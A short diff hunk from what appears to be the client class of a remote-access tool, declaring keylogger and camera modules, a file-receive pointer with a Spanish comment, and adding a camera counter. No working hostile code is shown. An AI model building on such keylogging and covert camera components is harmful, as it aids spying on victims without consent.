@@ -24,7 +24,7 @@ class Cliente {
 		mod_Keylogger* mod_Key = nullptr;
 		mod_Camera* mod_Cam = nullptr;
 
-
+		int iCAMCOUNT = 0;
 		//Para recibir archivo (single)
 		FILE *fpArchivo = nullptr;
 		
